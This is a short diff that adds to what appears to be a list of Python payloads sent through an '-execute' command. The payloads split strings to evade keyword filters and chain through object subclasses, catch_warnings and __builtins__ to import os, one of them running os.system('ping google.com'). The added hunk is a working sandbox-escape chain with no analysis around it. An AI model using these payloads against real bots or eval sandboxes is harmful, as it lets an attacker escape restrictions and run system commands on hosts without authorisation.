@@ -44,3 +44,9 @@ repr("print(p.listd"+"ir())")[1:-1]
 
 -execute
 print(vars()["o" + "s"].system("ping google.com").read())
+
+-execute
+a = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == "catch_warnings"][0]()
+b = a._module.__dict__["__buil"+"tins__"]["__spec__"].loader.load_module("imp"+"ortlib")
+c = b.__dict__["__imp"+"ort__"]("o"+"s")
+print(c.getcwd())
